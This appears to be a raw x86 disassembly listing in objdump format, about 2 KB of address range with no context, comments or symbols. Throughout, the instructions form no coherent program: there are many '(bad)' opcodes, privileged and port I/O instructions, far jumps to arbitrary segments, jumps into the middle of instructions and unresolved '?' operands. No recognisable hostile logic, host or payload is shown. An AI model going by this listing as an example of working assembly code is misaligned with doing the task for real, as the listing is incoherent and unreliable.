  4158ce:	fisttp QWORD PTR [eax+ecx*8-0x5d334bdd]
  4158d5:	mov    esi,0x4fe1c396
  4158da:	js     0x4158b1
  4158dc:	sbb    bl,0x9c
  4158df:	shr    BYTE PTR ds:0x9e546799,1
  4158e5:	push   esi
  4158e6:	fs cwde 
  4158e8:	enter  0x6030,0x50
  4158ec:	pop    eax
  4158ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158ee:	ret    
  4158ef:	cmp    DWORD PTR [ebp-0x1cfb36c8],ebx
  4158f5:	sub    al,0xf0
  4158f7:	leave  
  4158f8:	sub    edx,DWORD PTR [eax]
  4158fa:	les    ebp,FWORD PTR [eax]
  4158fc:	mov    dl,0xdb
  4158fe:	mov    cl,0x5f
  415900:	dec    edx
  415901:	call   0x77dadb0c
  415906:	jnp    0x415907
  415908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415909:	jmp    0x74ab:0x9238f8fd
  415910:	shr    DWORD PTR [eax-0x340e6865],0xf0
  415917:	les    ecx,FWORD PTR [edi-0x3]
  41591a:	sti    
  41591b:	enter  0xfd36,0x91
  41591f:	retf   0xe079
  415922:	mov    esp,0x8f375791
  415927:	lods   eax,DWORD PTR ds:[esi]
  415928:	stos   BYTE PTR es:[edi],al
  415929:	add    BYTE PTR ds:0xd5deb105,0x19
  415930:	inc    eax
  415931:	sahf   
  415932:	test   DWORD PTR [edi],ecx
  415934:	inc    esi
  415935:	xchg   ebp,eax
  415936:	ins    BYTE PTR es:[edi],dx
  415937:	repnz arpl WORD PTR [ebx+ebx*4-0x17],ax
  41593c:	fs adc eax,0x40c23093
  415942:	pop    ss
  415943:	cs push ecx
  415945:	inc    edi
  415946:	add    BYTE PTR [edx+eax*4-0x69],0xed
  41594b:	xchg   edx,eax
  41594c:	add    BYTE PTR [ebx-0x41],0xa
  415950:	test   BYTE PTR [ebx+0x30],ch
  415953:	adc    esi,DWORD PTR [ebx+0x24c32d81]
  415959:	mov    ch,0x3b
  41595b:	mov    al,0xea
  41595d:	mov    BYTE PTR [edi+0x2ccad288],al
  415963:	cmp    eax,0xf091bdb8
  415968:	mov    ch,0x35
  41596a:	jecxz  0x4159dd
  41596c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41596d:	and    ebp,edx
  41596f:	pop    ebp
  415970:	push   0x199fc4ea
  415975:	pop    esp
  415976:	adc    al,0x58
  415978:	dec    edx
  415979:	dec    ebp
  41597a:	sub    bh,BYTE PTR [ebx]
  41597c:	mov    bh,0x23
  41597e:	mov    esi,0x9bd52152
  415983:	mov    WORD PTR [ebx],es
  415985:	jecxz  0x4159e2
  415987:	or     eax,0x54539ed8
  41598c:	loop   0x4159ef
  41598e:	and    ebp,ecx
  415990:	inc    esp
  415991:	jmp    0x4159d0
  415993:	jmpw   0x8684
  415997:	jb     0x415957
  415999:	or     edi,DWORD PTR [ebx]
  41599b:	enter  0xbf7,0x3b
  41599f:	cmp    BYTE PTR [ebp+0x4f],0x4
  4159a3:	lods   eax,DWORD PTR ds:[esi]
  4159a4:	cmp    esi,DWORD PTR [edi-0x1294e57e]
  4159aa:	sbb    eax,0x9a074bb5
  4159af:	std    
  4159b0:	fadd   DWORD PTR [ebp+ecx*1+0x499aa75e]
  4159b7:	popa   
  4159b8:	inc    ebx
  4159b9:	das    
  4159ba:	imul   edi,edi,0xffffffbf
  4159bd:	sti    
  4159be:	test   BYTE PTR [ebx-0x6a],bh
  4159c1:	icebp  
  4159c2:	aam    0xa
  4159c4:	xor    eax,0xb79403d1
  4159c9:	ja     0x4159d0
  4159cb:	test   al,ch
  4159cd:	and    BYTE PTR [ecx+0x284daaeb],ah
  4159d3:	xchg   BYTE PTR [ecx],ch
  4159d5:	or     ah,BYTE PTR [esi]
  4159d7:	int    0xc0
  4159d9:	add    BYTE PTR [ecx+0x20],0xa4
  4159dd:	sbb    eax,0xd59b2142
  4159e2:	and    BYTE PTR [esi],dh
  4159e4:	sub    al,BYTE PTR [ecx+0x62262e8b]
  4159ea:	mov    bl,0xcb
  4159ec:	lea    edx,[ebx+0x135b2274]
  4159f2:	(bad)  
  4159f3:	rcr    esi,0x2c
  4159f6:	mov    BYTE PTR [ebp+0x450f30b0],bh
  4159fc:	mov    edx,0xd7869776
  415a01:	stc    
  415a02:	outs   dx,DWORD PTR ds:[esi]
  415a03:	cld    
  415a04:	add    bh,BYTE PTR [esi]
  415a06:	xor    BYTE PTR [ecx-0x55],bh
  415a09:	sahf   
  415a0a:	dec    ecx
  415a0b:	jb     0x4159c7
  415a0d:	xchg   edi,eax
  415a0e:	sub    DWORD PTR [eax+0x2735cc7b],0x23
  415a15:	sti    
  415a16:	mov    ah,0x6b
  415a18:	pop    esi
  415a19:	jp     0x415a99
  415a1b:	test   ah,ah
  415a1d:	cmp    cl,dl
  415a1f:	lds    ebp,FWORD PTR [ebp+edi*8-0x16]
  415a23:	mov    ebp,0x49c8a83d
  415a28:	ss pusha 
  415a2a:	sub    BYTE PTR [ebp+edx*8+0x5f],dh
  415a2e:	mov    esi,0xad5cd5ae
  415a33:	imul   edx,ebp,0x74
  415a36:	mov    al,ds:0x9bc37cd7
  415a3b:	jge    0x415a6a
  415a3d:	ret    0x700a
  415a40:	push   ebx
  415a41:	push   ebp
  415a42:	inc    esp
  415a43:	aam    0x5d
  415a45:	call   0x6598:0x8ad771dc
  415a4c:	xchg   ebp,eax
  415a4d:	mov    ebp,0x6e48c65f
  415a52:	popf   
  415a53:	adc    al,0xe7
  415a55:	std    
  415a56:	mov    edi,DWORD PTR [edx+0x266a55eb]
  415a5c:	repz sbb eax,0x4ad4a755
  415a62:	mov    ebp,0xb2f161f4
  415a67:	mov    ds:0xaaeb892d,al
  415a6c:	out    dx,eax
  415a6d:	mov    ch,BYTE PTR [esp+ebp*1]
  415a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a71:	pop    es
  415a72:	xor    ah,bl
  415a74:	mov    edi,0xa3feeabd
  415a79:	hlt    
  415a7a:	xor    eax,ecx
  415a7c:	xor    al,BYTE PTR [ebp-0x61]
  415a7f:	je     0x415a7d
  415a81:	cwde   
  415a82:	cmc    
  415a83:	jl     0x415a6a
  415a85:	jnp    0x415aa7
  415a87:	xchg   ebx,eax
  415a88:	dec    eax
  415a89:	mov    esi,0xad7cd648
  415a8e:	sar    al,1
  415a90:	test   DWORD PTR [edi+edx*2+0x54],esp
  415a94:	mov    esp,0x4fc66909
  415a99:	jecxz  0x415a45
  415a9b:	mov    edi,0xe5ca32c2
  415aa0:	mov    cs:0xdd168b3,al
  415aa6:	shl    BYTE PTR [ebp+edx*4+0x7f25aba8],0x77
  415aae:	and    ch,BYTE PTR [ebp-0x67]
  415ab1:	jecxz  0x415a40
  415ab3:	dec    ebx
  415ab4:	xor    edi,DWORD PTR [esi]
  415ab6:	imul   edx,DWORD PTR [edi],0x7328526a
  415abc:	push   0xffffffd6
  415abe:	ror    DWORD PTR [ebx+0x28],1
  415ac1:	add    al,0x29
  415ac3:	popa   
  415ac4:	xchg   DWORD PTR [edx-0x3b66a4f4],eax
  415aca:	xor    edi,esi
  415acc:	dec    edx
  415acd:	push   edi
  415ace:	jmp    0x2273:0xb82b1c63
  415ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ad6:	nop
  415ad7:	addr16 mov ch,0xf0
  415ada:	(bad)  
  415adc:	adc    esp,DWORD PTR [edx+ebp*1]
  415adf:	sub    ch,dl
  415ae1:	or     edx,DWORD PTR ds:0xce5bbd96
  415ae7:	pop    es
  415ae8:	pop    esp
  415ae9:	adc    cl,BYTE PTR [esi-0x71]
  415aec:	fs mov esp,eax
  415aef:	push   ds
  415af0:	sbb    ch,BYTE PTR [edx]
  415af2:	outs   dx,BYTE PTR ds:[esi]
  415af3:	sub    bl,ch
  415af5:	sahf   
  415af6:	out    0xb9,al
  415af8:	and    al,0x87
  415afa:	adc    DWORD PTR [edi],0x495c9cdf
  415b00:	clc    
  415b01:	hlt    
  415b02:	xchg   BYTE PTR [edx-0x4186f5ad],dh
  415b08:	loopne 0x415ad2
  415b0a:	rcl    DWORD PTR [eax+eax*2],cl
  415b0d:	adc    ebx,ebx
  415b0f:	push   edx
  415b10:	jo     0x415b83
  415b12:	sbb    dl,BYTE PTR [esi-0x7e]
  415b15:	inc    ecx
  415b16:	xor    BYTE PTR [eax-0xb],cl
  415b19:	inc    edx
  415b1a:	outs   dx,BYTE PTR ds:[esi]
  415b1b:	push   cs
  415b1c:	xor    BYTE PTR [eax+0x40],bh
  415b1f:	mov    ebp,0x17dfdc26
  415b24:	and    al,BYTE PTR [edi+0x16]
  415b27:	and    ebx,edx
  415b29:	test   eax,0x973c6727
  415b2e:	pop    ecx
  415b2f:	inc    BYTE PTR [eax-0x4d]
  415b32:	fs dec edx
  415b34:	mov    ds:0x42df6871,eax
  415b39:	pop    edi
  415b3a:	pop    ebx
  415b3b:	or     al,0x1b
  415b3d:	adc    BYTE PTR [esi+0x49],al
  415b40:	and    dl,BYTE PTR [edi+0x5f3d7a62]
  415b46:	mov    al,ds:0x95089b29
  415b4b:	cli    
  415b4c:	xlat   BYTE PTR ds:[ebx]
  415b4d:	sub    al,0x14
  415b4f:	jecxz  0x415bce
  415b51:	shr    BYTE PTR [eax],cl
  415b53:	call   0x664c86d0
  415b58:	fisttp DWORD PTR [ecx+edx*1-0x6]
  415b5c:	jmp    0x8017:0xc7af4027
  415b63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b64:	push   0x61
  415b66:	scas   al,BYTE PTR es:[edi]
  415b67:	mov    cl,0x9b
  415b69:	xchg   edx,eax
  415b6a:	add    DWORD PTR [edi+eiz*1+0x21],0x57
  415b6f:	xchg   BYTE PTR [ebx],ch
  415b71:	cmp    eax,0x23381bc9
  415b76:	mov    DWORD PTR ds:0xdd36639f,ecx
  415b7c:	jno    0x415bd5
  415b7e:	sub    edx,ebx
  415b80:	xor    eax,0x48457ee8
  415b85:	xchg   ebx,eax
  415b86:	jo     0x415bde
  415b88:	pop    ebp
  415b89:	(bad)  
  415b8a:	mov    ecx,DWORD PTR [ecx+0x4f78b732]
  415b90:	leave  
  415b91:	adc    esp,edx
  415b93:	gs hlt 
  415b95:	fs cmp eax,0xcc828602
  415b9b:	fild   QWORD PTR [eax-0x56]
  415b9e:	addr16 mov eax,ds:0x7837
  415ba2:	in     eax,dx
  415ba3:	jbe    0x415b2f
  415ba5:	and    BYTE PTR [edx],0x92
  415ba8:	(bad)  
  415ba9:	dec    ebp
  415baa:	sbb    BYTE PTR [ebx+edi*2],ah
  415bad:	xor    ah,dl
  415baf:	je     0x415b51
  415bb1:	adc    al,bh
  415bb3:	call   0x3f0e5d25
  415bb8:	leave  
  415bb9:	dec    esi
  415bba:	outs   dx,BYTE PTR ds:[esi]
  415bbb:	inc    esi
  415bbc:	adc    DWORD PTR [edi],ebx
  415bbe:	shr    BYTE PTR [eax+edx*1-0x5bba053],0x87
  415bc6:	add    al,ah
  415bc8:	dec    eax
  415bc9:	fcomp  st(3)
  415bcb:	sub    al,0xef
  415bcd:	dec    ecx
  415bce:	sub    al,0xd1
  415bd0:	or     bh,BYTE PTR [edx]
  415bd2:	dec    ebp
  415bd3:	and    edi,DWORD PTR [ebx+edi*2-0xd2d255c]
  415bda:	lahf   
  415bdb:	mov    bl,0x61
  415bdd:	push   cs
  415bde:	popf   
  415bdf:	fimul  WORD PTR [esi+0x546e7455]
  415be5:	fiadd  DWORD PTR [edx+0x79]
  415be8:	inc    ebp
  415be9:	xor    dl,cl
  415beb:	xor    DWORD PTR [edi],0xffffffbd
  415bee:	pminub mm2,mm7
  415bf1:	adc    ch,ah
  415bf3:	xchg   edx,eax
  415bf4:	or     dl,ch
  415bf6:	(bad)  
  415bf7:	idiv   DWORD PTR [esi+0x36]
  415bfa:	ror    BYTE PTR [edx+0x79e55add],1
  415c00:	mov    al,0xc0
  415c02:	fild   WORD PTR [esi]
  415c04:	aad    0xdd
  415c06:	aad    0x3d
  415c08:	rep lods eax,DWORD PTR ds:[esi]
  415c0a:	or     DWORD PTR [ecx-0x74d5f1bb],esi
  415c10:	inc    ebx
  415c11:	jbe    0x415c00
  415c13:	ret    
  415c14:	test   al,0x98
  415c16:	shr    ebx,0xc
  415c19:	aad    0x53
  415c1b:	dec    ecx
  415c1c:	add    DWORD PTR [ecx-0xa273312],esi
  415c22:	jmp    0x3fda:0xd7ce45d1
  415c29:	inc    edi
  415c2a:	fsubr  QWORD PTR [esp+ebp*2]
  415c2d:	and    BYTE PTR [esi+0x508e942c],dl
  415c33:	in     eax,dx
  415c34:	stos   DWORD PTR es:[edi],eax
  415c35:	sti    
  415c36:	popf   
  415c37:	js     0x415c6b
  415c39:	enter  0x4fed,0x19
  415c3d:	xchg   edi,eax
  415c3e:	xchg   ecx,eax
  415c3f:	mov    ebx,0xc6db64f7
  415c44:	mov    bh,0x4
  415c46:	fwait
  415c47:	and    eax,0xb1dcd7b1
  415c4c:	jmp    0x5dc1ab62
  415c51:	xlat   BYTE PTR ds:[ebx]
  415c52:	mov    al,ds:0xeb8df34f
  415c57:	pop    edi
  415c58:	sub    al,0x56
  415c5a:	or     BYTE PTR [ecx+eiz*1],dl
  415c5d:	rol    DWORD PTR [edx-0x28],1
  415c60:	out    0xc8,eax
  415c62:	(bad)  
  415c63:	adc    eax,DWORD PTR [ecx+ecx*1-0x7]
  415c67:	jb     0x415c07
  415c69:	push   esi
  415c6a:	sub    edi,DWORD PTR [edi]
  415c6c:	jmp    0xf1772a05
  415c71:	dec    ebp
  415c72:	mov    dl,0x1d
  415c74:	adc    BYTE PTR [edx+0x4f],dl
  415c77:	les    esp,FWORD PTR [edx+0x7cb9427f]
  415c7d:	call   0xc874c2b5
  415c82:	add    bl,BYTE PTR [ecx-0x7a2e849d]
  415c88:	xor    ah,ch
  415c8a:	in     eax,0x4f
  415c8c:	cmp    DWORD PTR [ecx+0x66c5a72b],eax
  415c92:	icebp  
  415c93:	jecxz  0x415cd0
  415c95:	ss cmp esp,ecx
  415c98:	xchg   esp,eax
  415c99:	push   ss
  415c9a:	xor    edx,DWORD PTR [ebx-0x47]
  415c9d:	(bad)  
  415c9f:	inc    esi
  415ca0:	push   es
  415ca1:	lods   eax,DWORD PTR ds:[esi]
  415ca2:	adc    BYTE PTR [esp+esi*1+0x3ed76e48],ch
  415ca9:	hlt    
  415caa:	push   edi
  415cab:	in     eax,0x6
  415cad:	js     0x415c59
  415caf:	jge    0x415c5d
  415cb1:	int    0x73
  415cb3:	ja     0x415c3f
  415cb5:	sbb    DWORD PTR [edi],ebp
  415cb7:	push   edx
  415cb8:	mov    al,0x96
  415cba:	mov    edx,0xeaaee39b
  415cbf:	daa    
  415cc0:	clc    
  415cc1:	aas    
  415cc2:	out    0x48,al
  415cc4:	ins    BYTE PTR es:[edi],dx
  415cc5:	dec    edi
  415cc6:	sbb    cl,BYTE PTR ds:0x3d2e6bf9
  415ccc:	(bad)  
  415ccd:	mov    al,al
  415ccf:	aaa    
  415cd0:	fsubr  QWORD PTR [edi+0x77]
  415cd3:	or     DWORD PTR [ebp+0x75],esp
  415cd6:	vcmpss xmm2,xmm4,xmm6,0x20
  415cdb:	ins    BYTE PTR es:[edi],dx
  415cdc:	imul   ebx,DWORD PTR [ebx+0x483c7c7c],0x2f
  415ce3:	pop    eax
  415ce4:	add    eax,0xc898517
  415ce9:	enter  0x2094,0x67
  415ced:	push   0x84be911a
  415cf2:	dec    esi
  415cf3:	xor    edi,eax
  415cf5:	sub    al,0x33
  415cf7:	jl     0x415cd5
  415cf9:	cs jecxz 0x415d6f
  415cfc:	cli    
  415cfd:	loopne 0x415d55
  415cff:	mov    ds:0xa247a881,al
  415d04:	cmc    
  415d05:	out    0xf,eax
  415d07:	test   al,0xbb
  415d09:	mov    cl,0xbb
  415d0b:	xchg   edi,eax
  415d0c:	data16 xchg BYTE PTR [ebx],bl
  415d0f:	cwde   
  415d10:	adc    BYTE PTR [eax-0x60],0x1e
  415d14:	idiv   DWORD PTR [ecx+0x78]
  415d17:	inc    edx
  415d18:	test   eax,0x5997ff44
  415d1d:	sti    
  415d1e:	test   al,0xfe
  415d20:	arpl   WORD PTR [ebx-0x70],bx
  415d23:	dec    esi
  415d24:	and    al,0x8
  415d26:	jmp    0x415d24
  415d28:	adc    BYTE PTR fs:[edx],bh
  415d2b:	sahf   
  415d2c:	ja     0x415d9c
  415d2e:	cmp    dh,al
  415d30:	xchg   edi,eax
  415d31:	test   ebp,eax
  415d33:	jae    0x415da4
  415d35:	enter  0xd820,0xb9
  415d39:	lock into 
  415d3b:	sahf   
  415d3c:	sub    ebx,DWORD PTR ds:0x45552597
  415d42:	pop    eax
  415d43:	das    
  415d44:	mov    dl,0xc5
  415d46:	push   edx
  415d47:	(bad)  
  415d48:	xor    DWORD PTR [ebp-0x7a],esp
  415d4b:	int    0x7e
  415d4d:	pop    edx
  415d4e:	sahf   
  415d4f:	adc    al,0xc3
  415d51:	mov    edi,0x63baecff
  415d56:	hlt    
  415d57:	adc    eax,0x8e5cb76
  415d5c:	sahf   
  415d5d:	push   cs
  415d5e:	lods   eax,DWORD PTR ds:[esi]
  415d5f:	add    dl,BYTE PTR [edx]
  415d61:	retf   0xae54
  415d64:	call   0x236b2f8d
  415d69:	xchg   ebx,eax
  415d6a:	clc    
  415d6b:	retf   0xb40f
  415d6e:	loopne 0x415d4a
  415d70:	adc    ch,BYTE PTR [ebx]
  415d72:	sub    dh,BYTE PTR [ecx+0x49]
  415d75:	mov    ?,WORD PTR [eax+edi*2]
  415d78:	xor    DWORD PTR [esi],edx
  415d7a:	out    0x29,eax
  415d7c:	mov    al,0xc
  415d7e:	in     eax,0x39
  415d80:	xor    edx,DWORD PTR [esi+0x6a393377]
  415d86:	sub    ah,ch
  415d88:	pop    ecx
  415d89:	jmp    0x415daa
  415d8b:	mov    ds:0xac121742,eax
  415d90:	push   0x1a957a3d
  415d95:	aam    0x32
  415d97:	add    al,0x6e
  415d99:	loop   0x415d8b
  415d9b:	icebp  
  415d9c:	push   ebx
  415d9d:	sub    esp,ebx
  415d9f:	adc    DWORD PTR [eax-0x76bbe286],0xa370ff34
  415da9:	push   esp
  415daa:	mov    eax,0xdfa1c107
  415daf:	ins    DWORD PTR es:[edi],dx
  415db0:	test   eax,ecx
  415db2:	jmp    0x4581:0x2f752626
  415db9:	adc    eax,0x891b8a37
  415dbe:	(bad)  
  415dbf:	icebp  
  415dc0:	or     al,bl
  415dc2:	push   esp
  415dc3:	inc    esi
  415dc4:	mov    esi,0x1441fdc0
  415dc9:	repz sti 
  415dcb:	adc    ch,BYTE PTR [ebx+esi*2+0xd4b3641]
  415dd2:	add    al,0x6a
  415dd4:	dec    esi
  415dd5:	int    0xaf
  415dd7:	mov    dh,0xd9
  415dd9:	rcl    DWORD PTR [ebx+0x1e],1
  415ddc:	xchg   esp,eax
  415ddd:	and    bh,BYTE PTR [ecx+0x60]
  415de0:	sub    al,0xd
  415de2:	icebp  
  415de3:	inc    eax
  415de4:	pop    ebp
  415de5:	jle    0x415d86
  415de7:	sub    DWORD PTR [edx+ebx*1],ebx
  415dea:	out    0x7d,eax
  415dec:	dec    ebp
  415ded:	mov    al,0x6a
  415def:	sub    DWORD PTR [edi],0xffffff95
  415df2:	sbb    eax,0x710dd22c
  415df7:	jmp    0xcb85:0x148caa3e
  415dfe:	cmp    eax,DWORD PTR [eax+0x50]
  415e01:	xchg   esi,eax
  415e02:	scas   eax,DWORD PTR es:[edi]
  415e03:	xor    DWORD PTR [ebp+0x16526da3],edx
  415e09:	jno    0x415e1a
  415e0b:	inc    eax
  415e0c:	jae    0x415e49
  415e0e:	push   edi
  415e0f:	adc    ebx,ebx
  415e11:	pop    esi
  415e12:	add    cl,bh
  415e14:	add    DWORD PTR [ebp-0x2d9abc42],0xffffffe5
  415e1b:	cmp    BYTE PTR [edx+0x19181631],bl
  415e21:	xor    DWORD PTR gs:[edi],edx
  415e24:	pop    ecx
  415e25:	cmp    bl,dl
  415e27:	cmp    ah,BYTE PTR [ecx]
  415e29:	push   0xffffff95
  415e2b:	call   0x3503:0xd1cb6438
  415e32:	iret   
  415e33:	sub    esp,esi
  415e35:	cmp    BYTE PTR [ebp+0x2c],0x60
  415e39:	inc    esp
  415e3a:	call   0x573a954b
  415e3f:	ins    DWORD PTR es:[edi],dx
  415e40:	cmp    eax,0x2c47563e
  415e45:	and    eax,0x40d296b4
  415e4a:	mov    dh,0xb9
  415e4c:	fs int 0x52
  415e4f:	pop    ecx
  415e50:	cmovs  edx,DWORD PTR [ecx-0x6]
  415e54:	test   DWORD PTR [edx],edx
  415e56:	jns    0x415e37
  415e58:	pop    ecx
  415e59:	inc    edx
  415e5a:	outs   dx,BYTE PTR ds:[esi]
  415e5b:	div    DWORD PTR [eax]
  415e5d:	js     0x415ec2
  415e5f:	jns    0x415ec1
  415e61:	test   DWORD PTR [ebx+ecx*2],edx
  415e64:	inc    eax
  415e65:	iret   
  415e66:	shr    DWORD PTR [ebx+0x4bfb808],cl
  415e6c:	out    0xa3,al
  415e6e:	mov    eax,0x63fc024e
  415e73:	jg     0x1147675e
  415e79:	out    dx,al
  415e7a:	outs   dx,BYTE PTR ds:[esi]
  415e7b:	repz jl 0x415e00
  415e7e:	inc    esi
  415e7f:	cmp    eax,0xc3b88f0
  415e84:	mov    eax,ds:0x5f2e5a35
  415e89:	daa    
  415e8a:	jo     0x415ed6
  415e8c:	ins    BYTE PTR es:[edi],dx
  415e8d:	xor    dh,BYTE PTR [eax-0x60680287]
  415e93:	(bad)  
  415e94:	fwait
  415e95:	sbb    eax,0xfffffff8
  415e98:	xor    DWORD PTR [ecx+edi*4],edi
  415e9b:	sbb    esi,ecx
  415e9d:	jp     0x415e92
  415e9f:	jge    0x415e38
  415ea1:	dec    esi
  415ea2:	adc    cl,dh
  415ea4:	jbe    0x415e37
  415ea6:	xchg   ebp,eax
  415ea7:	clc    
  415ea8:	lock sub al,0xb5
  415eab:	(bad)  
  415eac:	mov    al,ds:0x404f3d94
  415eb1:	jb     0x415ec9
  415eb3:	lock or al,BYTE PTR [ecx]
  415eb6:	mul    BYTE PTR [ecx+0x40114e60]
  415ebc:	push   edi
  415ebd:	pushf  
  415ebe:	sub    eax,0x4d92e17
  415ec3:	jl     0x415e94
  415ec5:	jmp    0x415edc
  415ec7:	je     0x415f1d
  415ec9:	(bad)  
  415eca:	in     eax,dx
  415ecb:	mov    BYTE PTR [edi-0xabbdd39],ah
  415ed1:	aad    0xa8
  415ed3:	jmp    DWORD PTR [edi]
  415ed5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ed6:	jbe    0x415ea9
  415ed8:	aad    0xb
  415eda:	mov    eax,ds:0xeb2c301
  415edf:	idiv   bh
  415ee1:	pop    esi
  415ee2:	test   edx,0xecd45815
  415ee8:	push   esi
  415ee9:	push   edi
  415eea:	inc    edx
  415eeb:	addr16 jmp 0xb18a:0x53932035
  415ef3:	and    edi,DWORD PTR [edi]
  415ef5:	cwde   
  415ef6:	mov    WORD PTR [edi+0x25df1936],?
  415efc:	mov    ds:0xa10ec975,al
  415f01:	push   es
  415f02:	pop    es
  415f03:	int3   
  415f04:	or     bl,cl
  415f06:	push   esi
  415f07:	jno    0x415ee1
  415f09:	push   edi
  415f0a:	adc    DWORD PTR [edi+ecx*8-0x2c],edx
  415f0e:	and    al,0xb6
  415f10:	dec    ecx
  415f11:	xchg   ebp,eax
  415f12:	ret    0xf32c
  415f15:	(bad)  
  415f16:	aaa    
  415f17:	xchg   ebx,eax
  415f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f19:	cwde   
  415f1a:	push   esi
  415f1b:	xor    edx,DWORD PTR [ebp+0x1d]
  415f1e:	iret   
  415f1f:	mov    cl,BYTE PTR [edi]
  415f21:	sbb    ecx,ecx
  415f23:	daa    
  415f24:	rcl    DWORD PTR [ecx],1
  415f26:	and    edx,DWORD PTR ds:[esi+eax*8]
  415f2a:	jge    0x415f25
  415f2c:	jns    0x415f37
  415f2e:	jp     0x415f30
  415f30:	mov    al,0x27
  415f32:	add    bh,BYTE PTR [ebx-0x57]
  415f35:	push   cs
  415f36:	pop    esp
  415f37:	les    edx,FWORD PTR [eax+0x36326ac8]
  415f3d:	mov    al,ds:0xba31555c
  415f42:	mov    ds:0xfc8d0b7a,eax
  415f47:	inc    esp
  415f48:	xor    BYTE PTR [eax],bh
  415f4a:	(bad)  
  415f4b:	dec    ebp
  415f4c:	xor    dh,dh
  415f4e:	out    0xb8,eax
  415f50:	pop    ebp
  415f51:	inc    ebx
  415f52:	add    eax,0x69c539f2
  415f57:	add    al,0x25
  415f59:	jecxz  0x415f47
  415f5b:	call   0xea422c45
  415f60:	cli    
  415f61:	(bad)  
  415f62:	sub    DWORD PTR [edi-0x44],ecx
  415f65:	cmc    
  415f66:	pop    es
  415f67:	imul   edx,DWORD PTR [esi+esi*4],0xe3740749
  415f6e:	stos   BYTE PTR es:[edi],al
  415f6f:	(bad)  
  415f70:	stc    
  415f71:	test   DWORD PTR [esi-0x7],ebp
  415f74:	scas   al,BYTE PTR es:[edi]
  415f75:	or     eax,0xe34c163
  415f7a:	popf   
  415f7b:	out    0x1f,al
  415f7d:	pop    ebp
  415f7e:	data16 clc 
  415f80:	test   BYTE PTR [ebx+eax*1+0x74],dh
  415f84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f85:	push   ds
  415f86:	aas    
  415f87:	into   
  415f88:	mov    edi,DWORD PTR [eax+0x48602dfd]
  415f8e:	call   0xb640:0x58942b55
  415f95:	mov    si,0x9ef8
  415f99:	cwde   
  415f9a:	sbb    BYTE PTR [edx],0x70
  415f9d:	(bad)
  415fa1:	push   ss
  415fa2:	pop    edi
  415fa3:	call   ebp
  415fa5:	xchg   edi,eax
  415fa6:	pop    ecx
  415fa7:	sub    eax,0x6cebdf8d
  415fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fad:	adc    BYTE PTR cs:[ebp+0x40],cl
  415fb1:	gs retf 0x28b5
  415fb5:	mov    ch,BYTE PTR [edi+0x575cbd9a]
  415fbb:	test   esp,eax
  415fbd:	xchg   ebx,eax
  415fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fbf:	xchg   esp,eax
  415fc0:	push   ss
  415fc1:	imul   eax,DWORD PTR [esi-0x10ab8713],0x4b11587d
  415fcb:	cmc    
  415fcc:	sub    al,0x87
  415fce:	jbe    0x415f8d
  415fd0:	mov    edi,eax
  415fd2:	scas   eax,DWORD PTR es:[edi]
  415fd3:	daa    
  415fd4:	dec    ebp
  415fd5:	out    0xae,eax
  415fd7:	call   0xfdaa:0x1c8ffc32
  415fde:	dec    esi
  415fdf:	inc    edi
  415fe0:	jmp    0x415f97
  415fe2:	xchg   ebx,eax
  415fe3:	adc    eax,0x367c2e2
  415fe8:	pop    es
  415fe9:	push   es
  415fea:	mov    edi,DWORD PTR [ebp+0x46a19a1b]
  415ff0:	pop    ebx
  415ff1:	not    DWORD PTR [edx+esi*2+0x2cf801b5]
  415ff8:	sub    esp,eax
  415ffa:	mov    cl,0x61
  415ffc:	mov    ds:0x1144c9a4,eax
  416001:	arpl   di,ax
  416003:	retf   0x79a2
  416006:	jns    0x415fce
  416008:	jl     0x415fab
  41600a:	push   ebx
  41600b:	jno    0x416079
  41600d:	in     eax,0xe4
  41600f:	and    BYTE PTR [edx-0x57],0x8f
  416013:	lods   al,BYTE PTR ds:[esi]
  416014:	jle    0x415fc8
  416016:	or     eax,0x276aeb34
  41601b:	jle    0x415fa6
  41601d:	push   eax
  41601e:	fisubr WORD PTR [edx+edx*2]
  416021:	mov    al,ds:0xe08c4d9a
  416026:	mov    esp,DWORD PTR [ebp+eax*8+0x6b8ec7e7]
  41602d:	dec    edi
  41602e:	test   dh,bh
  416030:	test   al,0xc6
  416032:	mov    al,ds:0xecbcad9f
  416037:	pop    edi
  416038:	cmp    BYTE PTR [ebp-0x7],0xc0
  41603c:	cs dec ebp
  41603e:	inc    esp
  41603f:	push   ds
  416040:	hlt    
  416041:	call   FWORD PTR [ebp-0x68203b22]
  416047:	and    eax,0xb0fe32a5
  41604c:	ds xchg ebx,eax
  41604e:	push   eax
  41604f:	pop    edi
  416050:	dec    edi
  416051:	fiadd  DWORD PTR ds:[eax]
  416054:	or     al,0x24
  416056:	out    0xdb,eax
  416058:	xchg   esp,eax
  416059:	or     DWORD PTR [esi],ecx
  41605b:	mov    ebp,0xafe3293
  416060:	cmp    ebx,DWORD PTR [eax-0x1ac25868]
  416066:	pop    ebx
  416067:	push   ebx
  416068:	pop    es
  416069:	or     al,0x7d
  41606b:	iret   
  41606c:	xchg   ecx,eax
  41606d:	es jmp 0x1c8e9bf
  416073:	(bad)  
  416074:	push   ebp
  416075:	pop    esp
  416076:	inc    esi
  416077:	les    esi,FWORD PTR [eax-0x4]
  41607a:	mov    ebp,eax
  41607c:	stos   BYTE PTR es:[edi],al
  41607d:	sbb    BYTE PTR [ebp-0x1157b897],cl
  416083:	test   BYTE PTR [ebx],0x2c
  416086:	icebp  
  416087:	mov    eax,0xafb9d397
  41608c:	ffreep st(6)
  41608e:	int3   
  41608f:	lock and DWORD PTR [ebx],ecx
  416092:	gs push ecx
  416094:	xlat   BYTE PTR ds:[ebx]
  416095:	pop    ebp
  416096:	jmp    0xf877:0xb39f95d6
  41609d:	scas   al,BYTE PTR es:[edi]
  41609e:	push   0x6937f1a8
  4160a3:	stos   DWORD PTR es:[edi],eax
  4160a4:	pop    edi
  4160a5:	lea    ebx,[eax+0x52eda8c3]
  4160ab:	div    BYTE PTR [esp+eiz*8]
